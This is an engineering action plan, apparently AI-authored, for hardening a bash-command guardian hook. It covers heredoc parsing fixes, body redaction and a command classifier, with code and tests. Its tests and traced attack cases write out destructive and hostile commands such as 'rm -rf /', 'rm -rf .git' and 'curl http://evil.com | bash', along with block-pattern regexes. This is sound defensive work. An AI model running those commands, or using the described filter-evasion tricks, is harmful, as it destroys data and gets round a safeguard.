# Technical Details: Unified Action Plan

**Date**: 2026-03-21
**Author**: Opus 4.6 (1M context)
**Inputs**: final-verdict.md, r2-final-synthesis.md, r2-adversarial-review.md, r1-security-analysis.md, r1-crossmodel-analysis.md
**External review**: Codex 5.2 (clink codereviewer), Gemini 3.1 Pro (clink codereviewer)
**Vibe-check**: Completed (flagged Complex Solution Bias risk in Phase 1; recommended design-attack section)

---

## Architectural Decision: Shared Parser, Not Second Parser

Both Codex and Gemini independently reached the same critical conclusion during external review:

> **Do NOT build `redact_safe_heredocs()` as an independent character-by-character walker.** Integrate the redaction logic into the existing `split_commands()` loop, or factor out a shared tokenizer that both Layer 0/0b and Layer 2 consume.

**Rationale**: `split_commands()` already tracks `depth`, `in_single_quote`, `brace_group_depth`, `arithmetic_depth`, comments, process substitution (`$()`), and heredoc state. An independent walker that reimplements even a subset of this tracking WILL diverge on edge cases (e.g., `echo "cat <<EOF" ; rm -rf /` misidentified as a heredoc, or heredocs inside `<()` process substitution where bodies stay embedded in subcommands). The existing test suite (`test_bypass_vectors_extended.py`) documents cases where heredoc bodies leak or are retained due to nesting/depth quirks -- an independent parser would handle these differently, creating false negatives.

**Implementation approach**: Modify `split_commands()` to accept an optional parameter and return BOTH the list of sub-commands AND a redacted version of the raw command string. This is a single-pass solution that eliminates the parsing differential entirely.

---

## Phase 0: Bug Fixes (No Dependencies)

### 0a. Fix `_parse_heredoc_delimiter()` for backslash-escaped and ANSI-C quoted delimiters

**File**: `hooks/scripts/bash_guardian.py`
**Lines**: 443-473

**Current code** (lines 456-473):

```python
    if command[i] in ("'", '"'):
        quote_char = command[i]
        start = i
        i += 1
        while i < len(command) and command[i] != quote_char:
            i += 1
        if i < len(command):
            i += 1  # consume closing quote
        raw_token = command[start:i]
        delim = raw_token[1:-1]  # strip quotes
        return (delim, raw_token, i)

    # Bare word: consume until whitespace, newline, or shell metachar
    start = i
    while i < len(command) and command[i] not in ' \t\n;|&<>()':
        i += 1
    raw_token = command[start:i]
    return (raw_token, raw_token, i)
```

**Bug**: Three delimiter forms are mishandled:

1. **Backslash-escaped**: `cat << \EOF` -- bash strips backslashes and uses `EOF` as delimiter. Current code stores `\EOF` as the literal delimiter, causing `_consume_heredoc_bodies()` to never find the terminator and consume all remaining input as heredoc body.

2. **ANSI-C quoting**: `cat << $'EOF'` -- bash strips the `$` prefix and quotes. Current code does not recognize `$'` as a quoting form, so it enters the bare-word branch and stores `$'EOF'` (with `'` stopping at `'` in the metachar set, actually). The parsing is wrong either way.

3. **Locale translation**: `cat << $"EOF"` -- same issue as ANSI-C quoting.

**Fix** (insert BEFORE the existing quoted-delimiter branch at line 456):

```python
def _parse_heredoc_delimiter(command: str, i: int) -> tuple[str, str, int]:
    """Parse heredoc delimiter word from position i.

    Handles:
      - Bare word: EOF, EOFZ, END_MARKER
      - Single-quoted: 'EOF' (literal heredoc, no expansion)
      - Double-quoted: "EOF" (expansion-active heredoc)
      - ANSI-C quoted: $'EOF' (strip $ prefix, then strip quotes)
      - Locale translation: $"EOF" (strip $ prefix, then strip quotes)
      - Backslash-escaped: \EOF (strip backslashes)

    Returns: (delimiter_text, raw_token, new_position)
    """
    if i >= len(command):
        return ('', '', i)

    # ANSI-C quoting: $'...' or locale translation: $"..."
    if (command[i] == '$' and i + 1 < len(command)
            and command[i + 1] in ("'", '"')):
        quote_char = command[i + 1]
        start = i
        i += 2  # skip $'
        while i < len(command) and command[i] != quote_char:
            i += 1
        if i < len(command):
            i += 1  # consume closing quote
        raw_token = command[start:i]
        # Strip $' and closing quote to get delimiter
        delim = raw_token[2:-1] if len(raw_token) >= 3 else ''
        return (delim, raw_token, i)

    if command[i] in ("'", '"'):
        quote_char = command[i]
        start = i
        i += 1
        while i < len(command) and command[i] != quote_char:
            i += 1
        if i < len(command):
            i += 1  # consume closing quote
        raw_token = command[start:i]
        delim = raw_token[1:-1]  # strip quotes
        return (delim, raw_token, i)

    # Bare word (possibly backslash-escaped): consume until whitespace/metachar
    start = i
    while i < len(command) and command[i] not in ' \t\n;|&<>()':
        i += 1
    raw_token = command[start:i]
    # Strip backslashes from bare words (bash behavior: \EOF -> EOF)
    delim = raw_token.replace('\\', '')
    return (delim, raw_token, i)
```

**Tests to add** (in `tests/regression/`):

```python
def test_backslash_delimiter(self):
    """cat << \\EOF should use EOF as delimiter, not \\EOF."""
    cmd = "cat << \\EOF\nsafe content\nEOF\nrm -rf .git"
    subs = split_commands(cmd)
    # rm -rf .git must appear as a separate sub-command, NOT consumed as body
    assert any("rm" in s for s in subs)

def test_ansi_c_delimiter(self):
    """cat << $'EOF' should use EOF as delimiter."""
    cmd = "cat << $'EOF'\nsafe content\nEOF\nrm -rf .git"
    subs = split_commands(cmd)
    assert any("rm" in s for s in subs)

def test_locale_delimiter(self):
    """cat << $\"EOF\" should use EOF as delimiter."""
    cmd = 'cat << $"EOF"\nsafe content\nEOF\nrm -rf .git'
    subs = split_commands(cmd)
    assert any("rm" in s for s in subs)
```

### 0b. Fix `_is_data_heredoc_command()` fail-open default

**Note**: This function does not exist yet in the codebase. It is defined in Plan A (heredoc-pattern-false-positives.md) and will be created in Phase 1. However, the fail-open bug was identified in Plan A's design and must be corrected at creation time.

**Rule**: When creating `_is_data_heredoc_command()` (or its replacement, the classifier in Phase 1), if no `<<` is found in the input, return `False` (UNSAFE / fail-closed), not `True`.

### 0c. re.MULTILINE Audit

**CRITICAL from adversarial review**: Do NOT blindly add `re.MULTILINE` to `match_block_patterns()` and `match_ask_patterns()`. The absence of `re.MULTILINE` is an accidental defense-in-depth that prevents some heredoc body false positives. Adding it would INCREASE false positives for patterns using `$` anchors.

**Approach**: Pattern-by-pattern audit, then decide per-pattern.

**Files to audit**:
- `assets/guardian.default.json` -- block patterns (lines 11-83), ask patterns (lines 85-158)
- `assets/guardian.recommended.json` -- equivalent sections

**Patterns affected by re.MULTILINE ($ anchor changes from end-of-string to end-of-line)**:

| Pattern | Current $ behavior | With re.MULTILINE | Assessment |
|---------|-------------------|-------------------|------------|
| `rm\s+-[rRf]+\s+/(?:\s*$\|\*)` | Only matches `rm -rf /` at end of entire command string | Would match `rm -rf /` at end of ANY line | After Phase 1 redaction: safe heredoc bodies are already removed, so this would only match in retained (unsafe) bodies or actual commands. **SAFE to add** after Phase 1 ships. |
| `(?i)delete\s+from\s+\w+(?:\s*;\|\s*$\|\s+--)` | Only matches SQL DELETE at end of entire string | Would match at end of any line | Same analysis: post-Phase-1, safe. **SAFE to add** after Phase 1. |
| Block patterns with `^` prefix (e.g., `(?:^\s*\|[;|&...])`) | `^` only matches start of entire string | Would match start of any line | These already have the `[;|&...]` alternation as a workaround. Adding re.MULTILINE would make the `^` branch work for multiline inputs. **SAFE to add.** |

**Decision**: Defer re.MULTILINE addition to AFTER Phase 1 ships and is validated. Phase 1 redaction changes what content Layer 0/0b sees, making the re.MULTILINE analysis dependent on Phase 1's behavior. Adding both simultaneously compounds risk.

**Implementation**: When ready, change in `_guardian_utils.py`:

```python
# Line 872 (match_block_patterns):
match = safe_regex_search(pattern, command, re.IGNORECASE | re.DOTALL | re.MULTILINE)

# Line 1042 (match_ask_patterns):
match = safe_regex_search(pattern, command, re.IGNORECASE | re.DOTALL | re.MULTILINE)
```

**Tests**: For each pattern using `$`, add a test with the destructive command mid-string followed by another line. Verify the pattern matches after the flag change.

---

## Phase 1: Heredoc Body Redaction

### 1a. Design: Integrated `split_commands()` with Redaction

**File**: `hooks/scripts/bash_guardian.py`
**Lines**: 270-441 (`split_commands`), 476-506 (`_consume_heredoc_bodies`)

**Key design change**: Instead of a separate `redact_safe_heredocs()` function, modify `split_commands()` to optionally produce a redacted version of the raw command alongside the sub-command list. This eliminates the parsing differential risk identified by both Codex and Gemini.

**New signature**:

```python
def split_commands(command: str, redact_safe_heredocs: bool = False
                   ) -> list[str] | tuple[list[str], str]:
    """Split compound command into sub-commands.

    Args:
        command: Raw bash command string.
        redact_safe_heredocs: If True, also return a redacted version of
            the raw command with safe heredoc bodies replaced by empty
            lines (preserving newline count). Default False for backward
            compatibility.

    Returns:
        If redact_safe_heredocs is False: list of sub-command strings.
        If redact_safe_heredocs is True: tuple of (sub-commands, redacted_command).
    """
```

**Alternative** (if modifying `split_commands()` signature is too risky): Create `split_commands_with_redaction()` that wraps `split_commands()` internals. Both functions call a shared `_tokenize_command()` generator that yields tokens with position information.

**Redaction integration in `_consume_heredoc_bodies()`**:

The current `_consume_heredoc_bodies()` (lines 476-506) consumes body lines but does not track their positions. Modify it to return body line ranges:

```python
def _consume_heredoc_bodies(
    command: str, i: int,
    pending: list[tuple[str, bool]],
    classify: bool = False,
    cmd_before_heredoc: str = ""
) -> int | tuple[int, list[tuple[int, int, bool]]]:
    """Consume heredoc body lines until each delimiter is matched.

    Args:
        command: Full command string.
        i: Current position (start of first body line).
        pending: List of (delimiter, strip_tabs) tuples.
        classify: If True, also return body ranges with safety classification.
        cmd_before_heredoc: The command text before the << operator,
            used for classification when classify=True.

    Returns:
        If classify is False: new position after all bodies consumed.
        If classify is True: tuple of (new_position, body_ranges) where
            body_ranges is list of (start, end, is_safe) tuples.
    """
    body_ranges = []
    for delim, strip_tabs in pending:
        body_start = i
        while i < len(command):
            line_start = i
            while i < len(command) and command[i] != '\n':
                i += 1
            line = command[line_start:i]
            if i < len(command):
                i += 1
            cmp_line = line.rstrip('\r')
            if strip_tabs:
                cmp_line = cmp_line.lstrip('\t')
            if cmp_line == delim:
                # body_start to line_start is the body (excluding delimiter line)
                if classify:
                    is_safe = _classify_heredoc_safety(cmd_before_heredoc)
                    body_ranges.append((body_start, line_start, is_safe))
                break
        else:
            # Unterminated heredoc: fail-closed, mark as UNSAFE
            if classify:
                body_ranges.append((body_start, i, False))

    if classify:
        return i, body_ranges
    return i
```

**Redacted string construction** (in `split_commands()`, after all parsing is complete):

```python
if redact_safe_heredocs and body_ranges:
    # Build redacted command by replacing safe body content
    # while preserving newline count
    parts = []
    prev_end = 0
    for start, end, is_safe in sorted(body_ranges):
        parts.append(command[prev_end:start])
        if is_safe:
            # Preserve newline count: replace each body line with empty line
            body_text = command[start:end]
            newline_count = body_text.count('\n')
            parts.append('\n' * newline_count)
        else:
            # Retain body as-is
            parts.append(command[start:end])
        prev_end = end
    parts.append(command[prev_end:])
    redacted = ''.join(parts)
    return [cmd for cmd in sub_commands if cmd], redacted
```

**Critical**: Newline count is preserved, not collapsed. This prevents:
- Token merging (delimiter merging with next command)
- Line alignment changes affecting `^`/`$` anchored patterns
- Synthetic adjacency creating new false matches

### 1b. Heredoc Command Classifier: `_classify_heredoc_safety()`

**File**: `hooks/scripts/bash_guardian.py`
**Location**: New function, placed near `_parse_heredoc_delimiter()` (after line 473)

```python
# Passive data sinks: commands that process data, never execute it.
# Heredoc bodies feeding these commands are safe to redact.
_PASSIVE_DATA_SINKS = frozenset({
    'cat', 'tee',
    'grep', 'egrep', 'fgrep', 'head', 'tail', 'wc', 'sort', 'uniq',
    'cut', 'tr', 'fold', 'fmt', 'column', 'paste', 'join', 'comm',
    'echo', 'printf',
    'jq', 'yq',
    'diff', 'cmp', 'md5sum', 'sha256sum', 'sha1sum',
})

# Interpreter commands: ALWAYS unsafe, regardless of other signals.
_INTERPRETER_COMMANDS = frozenset({
    'bash', 'sh', 'zsh', 'dash', 'ksh', 'csh', 'tcsh', 'fish',
    'python', 'python2', 'python3', 'py',
    'node', 'deno', 'bun',
    'perl', 'ruby',
    'source', 'eval',
    'exec',
})

# Output redirection operators that make a heredoc UNSAFE.
# Must be exhaustive to prevent bypasses via exotic redirection forms.
_OUTPUT_REDIR_PATTERN = re.compile(
    r'(?:'
    r'[0-9]*>{1,2}'   # >, >>, 2>, 2>>, n>, n>>
    r'|[0-9]*>\|'     # >| (clobber), n>|
    r'|&>'             # &> (redirect both stdout+stderr)
    r')'
    r'\s*[^\s&|;)>]'  # followed by a target (not another operator)
)


def _classify_heredoc_safety(cmd_before_heredoc: str) -> bool:
    """Classify whether a heredoc body is safe to redact.

    Uses a 5-rule hybrid classifier:
      1. Interpreter command -> UNSAFE (retain body)
      2. Output redirection present -> UNSAFE (retain body)
      3. Pipeline member -> UNSAFE (retain body)
      4. Passive data sink -> SAFE (redact body)
      5. Unknown command -> UNSAFE (fail-closed, retain body)

    Rule ordering is critical: rules 1-3 MUST be checked before rule 4.
    If cat is in _PASSIVE_DATA_SINKS but the command is "cat > script.sh",
    rule 2 catches it before rule 4 can redact.

    Args:
        cmd_before_heredoc: The command text preceding the << operator,
            from the current segment (not split on pipes -- this is the
            full segment text accumulated by split_commands() up to <<).

    Returns:
        True if the heredoc body is safe to redact, False otherwise.
    """
    # Extract base command name (skip env prefixes, variable assignments)
    base_cmd = _extract_base_command(cmd_before_heredoc)

    # Rule 1: Interpreter commands are always unsafe
    if base_cmd in _INTERPRETER_COMMANDS:
        return False

    # Rule 2: Output redirection makes the heredoc unsafe
    # (body content is written to a file, not just displayed)
    # Check the full command text, not just the base command name
    if _OUTPUT_REDIR_PATTERN.search(cmd_before_heredoc):
        return False

    # Rule 3: Pipeline membership makes the heredoc unsafe
    # NOTE: This check uses the segment text before <<. If we are in a
    # pipeline, split_commands() already split on | before reaching the
    # newline handler. So for "cat << EOF | bash", the cmd_before_heredoc
    # seen here is just "cat << EOF" and the pipe is invisible.
    #
    # HOWEVER: pending_heredocs persists across pipe splits. The pipe
    # split happens at line 359 BEFORE the newline handler at line 421.
    # So the body is consumed in the NEXT segment's context. We need
    # the pipe flag from split_commands() state, not from the text.
    #
    # Implementation: split_commands() must pass a `was_piped` flag
    # alongside cmd_before_heredoc when classify=True.
    #
    # For now, this rule is handled via the was_piped parameter
    # in the caller, not here. See the integration note below.

    # Rule 4: Passive data sinks are safe
    if base_cmd in _PASSIVE_DATA_SINKS:
        return True

    # Rule 5: Unknown commands fail-closed
    return False


def _extract_base_command(cmd_text: str) -> str:
    """Extract the base command name from a command string.

    Handles:
      - env PREFIX=val cmd -> cmd
      - VAR=val cmd -> cmd
      - command cmd -> cmd
      - /usr/bin/cmd -> cmd
      - sudo cmd -> cmd

    Args:
        cmd_text: Command text (may include flags, args, etc.)

    Returns:
        Base command name (lowercase), or empty string if unparseable.
    """
    cmd_text = cmd_text.strip()
    if not cmd_text:
        return ''

    try:
        parts = shlex.split(cmd_text)
    except ValueError:
        # Unparseable: fail-closed (return empty -> rule 5 applies)
        return ''

    # Skip variable assignments (VAR=val) and known prefixes
    skip_prefixes = {'env', 'command', 'builtin', 'sudo', 'nice',
                     'nohup', 'time', 'strace'}
    i = 0
    while i < len(parts):
        part = parts[i]
        # Variable assignment: contains = before any /
        if '=' in part and '/' not in part.split('=')[0]:
            i += 1
            continue
        # Known prefix commands (skip, move to next)
        base = Path(part).name if '/' in part else part
        if base.lower() in skip_prefixes:
            i += 1
            # sudo may have flags like -u user
            if base.lower() == 'sudo':
                while i < len(parts) and parts[i].startswith('-'):
                    i += 1
                    # Skip flag argument if present (e.g., -u root)
                    if i < len(parts) and not parts[i].startswith('-'):
                        i += 1
            continue
        # This is the actual command
        base = Path(part).name if '/' in part else part
        return base.lower()

    return ''
```

### 1c. Pipeline-Heredoc Safety: The `was_piped` Flag

**The problem**: When `split_commands()` encounters `cat << EOF | bash`, it:
1. Accumulates `"cat << EOF"` as current segment
2. Hits `|` at line 359, emits `"cat << EOF"` as sub-command, resets current
3. Now `cmd_so_far` is `"bash"`, but `pending_heredocs` still has `EOF`
4. At the newline, body is consumed in the context of the `"bash"` segment

**The fix**: When `pending_heredocs` is non-empty at the point of a pipe split (line 359), record that those pending heredocs crossed a pipe boundary. When they are later consumed, mark them as UNSAFE regardless of the pre-heredoc command.

```python
# In split_commands(), modify the pipe handling (line 359):
if c == "|":
    sub_commands.append("".join(current).strip())
    # Track that pending heredocs crossed a pipe boundary
    if pending_heredocs and redact_safe_heredocs:
        piped_heredocs = True  # Flag for the body consumer
    current = []
    i += 1
    continue

# In the newline handler (line 421):
if c == "\n":
    cmd_text = "".join(current).strip()
    sub_commands.append(cmd_text)
    current = []
    i += 1
    if pending_heredocs:
        if redact_safe_heredocs:
            result = _consume_heredoc_bodies(
                command, i, pending_heredocs,
                classify=True,
                cmd_before_heredoc=cmd_text if not piped_heredocs else ""
            )
            i, ranges = result
            # If piped, force all ranges to UNSAFE
            if piped_heredocs:
                ranges = [(s, e, False) for s, e, _ in ranges]
            all_body_ranges.extend(ranges)
            piped_heredocs = False
        else:
            i = _consume_heredoc_bodies(command, i, pending_heredocs)
        pending_heredocs = []
    continue
```

### 1d. Integration in `main()`

**File**: `hooks/scripts/bash_guardian.py`
**Lines**: 1422-1437

**Current code**:

```python
    # ========== Layer 0: Block Patterns (short-circuit on catastrophic) ==========
    blocked, reason = match_block_patterns(command)
    ...
    # Layer 0b: Ask patterns
    needs_ask, ask_reason = match_ask_patterns(command)
    ...
    # ========== Layer 2: Command Decomposition (moved before Layer 1) ==========
    sub_commands = split_commands(command)
```

**Changed code**:

```python
    # ========== Layer 2: Command Decomposition + Heredoc Redaction ==========
    # Perform split_commands FIRST to get the redacted command for Layer 0/0b.
    # This is a single-pass operation: the same parser produces both outputs.
    result = split_commands(command, redact_safe_heredocs=True)
    sub_commands, redacted_command = result

    # ========== Layer 0: Block Patterns (short-circuit on catastrophic) ==========
    blocked, reason = match_block_patterns(redacted_command)
    if blocked:
        log_guardian("BLOCK", f"{reason}: {cmd_preview}")
        if is_dry_run():
            log_guardian("DRY-RUN", "Would DENY")
            sys.exit(0)
        print(json.dumps(deny_response(reason)))
        sys.exit(0)

    # ========== Collect verdicts from all layers ==========
    final_verdict: tuple[str, str] = ("allow", "")

    # Layer 0b: Ask patterns
    needs_ask, ask_reason = match_ask_patterns(redacted_command)
    if needs_ask:
        final_verdict = _stronger_verdict(final_verdict, ("ask", ask_reason))

    # ========== Layer 1: Protected Path Scan ==========
    # Layer 1 continues to use joined sub-commands (unchanged)
    scan_text = ' '.join(
        sub for sub in sub_commands if not sub.lstrip().startswith('#')
    )
    scan_verdict, scan_reason = scan_protected_paths(scan_text, config)
```

**Key invariant**: Layer 1 and Layer 3/4 use the original sub-commands from `split_commands()`, unchanged. Only Layer 0/0b see the redacted string. This is the minimal change principle.

### 1e. Redirection-Based Exemption Alternative

The adversarial review (r2-adversarial-review.md, Section 6.1) surfaced a simpler alternative worth evaluating:

> Instead of a command allowlist, exempt heredoc bodies when a file redirection (`>`) is present.

**Analysis**: This approach is INSUFFICIENT as the primary mechanism because:
- It would REDACT `cat << EOF > file.txt` (has redirection, body is data being written) -- but this is the DANGEROUS case where the body content goes to a file that could be executed later.
- Wait -- the proposal says EXEMPT bodies when `>` IS present. This means RETAIN bodies when there's a redirect. That is the correct direction (rule 2 in our classifier).
- But it would NOT handle the base case: `cat << EOF\nrm -rf /\nEOF` has NO redirection, so the body would NOT be exempted (retained) -- it would be redacted. This is the CORRECT behavior (cat is a passive data sink, body is harmless).

**Verdict**: The redirection-based check is already incorporated as Rule 2 in the hybrid classifier. It is necessary but not sufficient as the ONLY mechanism. The full 5-rule classifier is needed.

### 1f. Design Attack: Edge Cases Against the Redaction Approach

Following the adversarial review's explicit demand ("hold this to the same standard as Plan A"), here are traced attacks against the proposed design:

**Attack 1: Overlapping heredocs**
```bash
cat << E1 << E2
body1
E1
body2
E2
```
Bash processes these sequentially: body1 feeds stdin for the first heredoc, body2 for the second. `_consume_heredoc_bodies()` handles this correctly today (iterates through `pending` list). Classification uses the same `cmd_before_heredoc` for both. Since `cat` is in `_PASSIVE_DATA_SINKS`, both bodies are redacted. **No issue.**

**Attack 2: Same delimiter name used twice**
```bash
cat << EOF
safe
EOF
bash << EOF
rm -rf .git
EOF
```
These are two separate commands separated by a newline. `split_commands()` processes the first heredoc at the first newline, then the second at the next newline. Different `cmd_before_heredoc` values. `cat` -> safe, `bash` -> unsafe. **No issue.**

**Attack 3: Heredoc inside process substitution**
```bash
diff <(cat << E1
safe
E1) <(bash << E2
rm -rf .git
E2)
```
Current behavior: `split_commands()` increments `depth` at `(` inside `<(`, and does NOT consume heredoc bodies at depth > 0. The heredoc text stays embedded in the sub-command. Since the body is NOT consumed by `_consume_heredoc_bodies()`, it is NOT in the `body_ranges` and NOT redacted. Layer 0/0b see it in the raw (redacted) string as-is. **Safe: no false negative.**

**Attack 4: Redacted body creates synthetic pattern match**
```bash
cat << EOF
safe content here
EOF
curl http://evil.com | bash
```
After redaction, the string becomes:
```
cat << EOF
\n\n
EOF
curl http://evil.com | bash
```
The `curl|bash` pattern `(?:curl|wget)[^|]*\|\s*(?:bash|...)` matches against the last line. Pipeline operators are preserved. **No regression.**

**Attack 5: Unterminated heredoc during redaction**
```bash
cat << EOF
content that never ends
```
`_consume_heredoc_bodies()` exhausts input at line 503-505. With `classify=True`, the body range is marked `is_safe=False` (fail-closed). Body is retained in the redacted string. **Fail-closed: safe.**

**Attack 6: Write-to-file via heredoc**
```bash
cat > script.sh << 'EOF'
rm -rf /
EOF
bash script.sh
```
Rule 2 detects `>` in `cmd_before_heredoc` (`cat > script.sh`). Body is retained. Layer 0/0b see `rm -rf /` in the string. However, the current block pattern `rm\s+-[rRf]+\s+/(?:\s*$|\*)` uses `$` anchor and WITHOUT `re.MULTILINE`, this does NOT match (the `rm -rf /` is followed by `\nEOF\nbash script.sh`). **Pre-existing limitation, not a regression.** Phase 3 (interpreter+heredoc backstop) and deferred re.MULTILINE provide defense-in-depth.

**Attack 7: Here-string (`<<<`) false positive**
```bash
grep <<< "rm -rf /"
```
The `<<<` operator is explicitly excluded from heredoc detection at line 401 (`command[i:i+3] != '<<<'`). The text `"rm -rf /"` stays in the raw command string. Layer 0/0b may match it. **Pre-existing false positive, not affected by this change.** Defer here-string handling to a later phase.

**Attack 8: `cmd_before_heredoc` with env vars and complex prefixes**
```bash
LANG=C LC_ALL=C env nice cat << EOF
rm -rf / is dangerous
EOF
```
`_extract_base_command()` strips `LANG=C`, `LC_ALL=C`, `env`, `nice` and extracts `cat`. Rule 4 classifies as safe. Body is redacted. **Correct.**

**Attack 9: `eval` wrapping a heredoc command**
```bash
eval 'cat << EOF
rm -rf /
EOF'
```
`_extract_base_command()` extracts `eval` after skipping nothing (eval is not in skip_prefixes). Wait -- actually `eval` is not skipped, it IS the base command. Rule 1: `eval` is in `_INTERPRETER_COMMANDS`. Body is retained. However, the heredoc is inside single quotes passed to eval, so `split_commands()` may not see the `<<` as a heredoc operator (it's inside single quotes). This is a pre-existing parsing limitation where single-quoted heredocs inside eval are not processed. **Not a regression.**

### 1g. Tests

**New test file**: `tests/regression/test_heredoc_redaction.py`

Must-have test cases (approximately 25 tests):

```python
class TestHeredocRedaction(unittest.TestCase):
    """Test heredoc body redaction for Layer 0/0b false positive elimination."""

    # --- Safe redaction cases (body SHOULD be redacted) ---

    def test_cat_heredoc_body_redacted(self):
        """cat << EOF with dangerous-looking body should be redacted."""
        cmd = "cat << EOF\nrm -rf / is dangerous\nEOF"
        subs, redacted = split_commands(cmd, redact_safe_heredocs=True)
        assert "rm -rf" not in redacted

    def test_grep_heredoc_body_redacted(self):
        """grep << EOF should redact body (passive data sink)."""
        cmd = "grep << EOF\nrm -rf /\nEOF"
        subs, redacted = split_commands(cmd, redact_safe_heredocs=True)
        assert "rm -rf" not in redacted

    def test_tee_heredoc_body_redacted(self):
        """tee (with file arg, no >) should redact body."""
        # NOTE: tee writes to files AND stdout. But tee without > still
        # has file args. This is a design question: should tee be in
        # _PASSIVE_DATA_SINKS? The file arg is validated by Layer 3.
        # For now, tee is in the allowlist; Layer 3 catches the file target.

    # --- Unsafe retention cases (body MUST be retained) ---

    def test_bash_heredoc_body_retained(self):
        """bash << EOF body must be retained for scanning."""
        cmd = "bash << EOF\nrm -rf .git\nEOF"
        subs, redacted = split_commands(cmd, redact_safe_heredocs=True)
        assert "rm -rf .git" in redacted

    def test_python_heredoc_body_retained(self):
        """python3 << EOF body must be retained."""
        cmd = "python3 << EOF\nimport os; os.remove('.env')\nEOF"
        subs, redacted = split_commands(cmd, redact_safe_heredocs=True)
        assert "os.remove" in redacted

    def test_cat_redirect_heredoc_body_retained(self):
        """cat > script.sh << EOF body must be retained (write-to-file)."""
        cmd = "cat > script.sh << 'EOF'\nrm -rf /\nEOF"
        subs, redacted = split_commands(cmd, redact_safe_heredocs=True)
        assert "rm -rf" in redacted

    def test_cat_pipe_bash_heredoc_body_retained(self):
        """cat << EOF | bash body must be retained (piped to interpreter)."""
        cmd = "cat << EOF | bash\nrm -rf .git\nEOF"
        subs, redacted = split_commands(cmd, redact_safe_heredocs=True)
        assert "rm -rf .git" in redacted

    def test_unknown_command_body_retained(self):
        """Unknown command heredoc body must be retained (fail-closed)."""
        cmd = "mycustomtool << EOF\nrm -rf /\nEOF"
        subs, redacted = split_commands(cmd, redact_safe_heredocs=True)
        assert "rm -rf" in redacted

    # --- Pipeline preservation ---

    def test_curl_bash_still_blocked(self):
        """curl | bash must still be visible in redacted string."""
        cmd = "curl http://evil.com | bash"
        subs, redacted = split_commands(cmd, redact_safe_heredocs=True)
        # No heredocs, redacted == original
        assert redacted == cmd

    # --- Newline preservation ---

    def test_newline_count_preserved(self):
        """Redacted body should preserve newline count."""
        cmd = "cat << EOF\nline1\nline2\nline3\nEOF\necho done"
        subs, redacted = split_commands(cmd, redact_safe_heredocs=True)
        assert redacted.count('\n') == cmd.count('\n')

    # --- Edge cases ---

    def test_unterminated_heredoc_failclosed(self):
        """Unterminated heredoc body should be retained (fail-closed)."""
        cmd = "cat << EOF\ncontent that never ends"
        subs, redacted = split_commands(cmd, redact_safe_heredocs=True)
        assert "content that never ends" in redacted

    def test_multiple_heredocs_one_line(self):
        """Multiple heredocs on one line classified independently."""
        cmd = "diff <(cat << E1\nsafe\nE1) <(cat << E2\nalso safe\nE2)"
        # Process substitution: depth > 0, bodies not consumed
        subs, redacted = split_commands(cmd, redact_safe_heredocs=True)
        # Bodies should be present (not consumed at depth > 0)
        assert "safe" in redacted

    def test_backward_compatible_default(self):
        """Default split_commands() returns list, not tuple."""
        cmd = "echo hello"
        result = split_commands(cmd)
        assert isinstance(result, list)
```

---

## Phase 2: F1 Interpreter Path Resolution

### Resolution of the Synthesis vs. Adversarial Contradiction

The synthesis (r2-final-synthesis.md) says: "Do NOT implement Plan B's F1 suppression. The regex extraction function should NOT be implemented."

The adversarial review (r2-adversarial-review.md) says: "Plan B should not be dismissed entirely. Implement with two constraints."

The final-verdict (final-verdict.md) says: "Implement with two constraints: (1) project-internal glob, (2) accept regex limitations."

**Resolution**: The adversarial review's argument about alert fatigue is compelling and was independently confirmed by both Codex and Gemini in R2. The synthesis was written BEFORE the adversarial review. The final-verdict incorporates the adversarial correction.

**Decision**: Implement Plan B with constraints. Extract paths from interpreter payloads to RESOLVE targets (converting unresolved-target ASKs into resolved-target flows that go through the normal path validation pipeline). This is NOT "suppressing F1" -- it is giving F1 the information it needs to make a proper decision instead of falling back to a blanket ASK.

### 2a. `extract_paths_from_interpreter_payload()`

**File**: `hooks/scripts/bash_guardian.py`
**Location**: New function, near `extract_paths()` (around line 980)

```python
def extract_paths_from_interpreter_payload(
    command: str, project_dir: Path
) -> list[Path]:
    """Extract file paths from interpreter -c/-e payload strings.

    Attempts to resolve path targets from interpreter commands like:
        python3 -c "os.remove('.staging/intent-123.json')"
        node -e "fs.unlinkSync('./temp/cache.txt')"

    Uses regex extraction of string literals, restricted to:
    - Single and double-quoted string literals only
    - Strings that look like file paths (contain / or start with .)
    - Paths that resolve within the project directory

    Documented limitations (fail-closed to F1 ASK):
    - f-strings: f".claude/{var}" -- variable portion unresolvable
    - Triple-quoted strings: '''...''' -- not extracted
    - String concatenation: "." + "env" -- not extracted
    - chr()/String.fromCharCode() -- not extracted
    - Heredoc-fed interpreters: python3 << EOF -- not handled (Phase 3)

    Args:
        command: The bash command string.
        project_dir: Project directory for path resolution.

    Returns:
        List of resolved Path objects within the project, or empty list
        if no paths could be extracted (triggers F1 ASK).
    """
    from _guardian_utils import extract_interpreter_payload

    payload = extract_interpreter_payload(command)
    if payload is None:
        return []

    # Extract string literals from the payload
    # Matches 'single-quoted' and "double-quoted" strings
    # Does NOT match f-strings, triple-quotes, or raw strings with r prefix
    string_literals = re.findall(
        r"""(?:'([^'\\]*(?:\\.[^'\\]*)*)'|"([^"\\]*(?:\\.[^"\\]*)*)")""",
        payload
    )

    paths = []
    for groups in string_literals:
        # findall returns tuple of groups; pick the non-empty one
        literal = groups[0] or groups[1]
        if not literal:
            continue

        # Must look like a file path
        if not ('/' in literal or literal.startswith('.')):
            continue

        # Skip URLs (contain ://)
        if '://' in literal:
            continue

        # Skip MIME types and common non-path patterns
        if literal.count('/') == 1 and not literal.startswith(('.', '/')):
            continue  # e.g., "application/json"

        try:
            path = Path(literal)
            if not path.is_absolute():
                path = project_dir / path

            # CONSTRAINT 1: Project-internal only
            try:
                resolved = path.resolve(strict=False)
                if not str(resolved).startswith(str(project_dir.resolve())):
                    continue
            except (OSError, ValueError):
                continue

            # Expand globs (CONSTRAINT: project-internal only)
            if '*' in str(path) or '?' in str(path) or '[' in str(path):
                # Use glob within project directory only
                expanded = glob.glob(str(path))
                for exp in expanded:
                    p = Path(exp)
                    try:
                        if str(p.resolve()).startswith(str(project_dir.resolve())):
                            paths.append(p)
                    except (OSError, ValueError):
                        continue
            else:
                paths.append(resolved)
        except (OSError, ValueError):
            continue

    return paths
```

### 2b. Modified F1 Block in `main()`

**File**: `hooks/scripts/bash_guardian.py`
**Lines**: 1474-1481

**Current code**:

```python
        # F1: Fail-closed safety net
        if (is_write or is_delete) and not sub_paths:
            op_type = "delete" if is_delete else "write"
            final_verdict = _stronger_verdict(
                final_verdict,
                ("ask", f"Detected {op_type} but could not resolve target paths"),
            )
```

**Changed code**:

```python
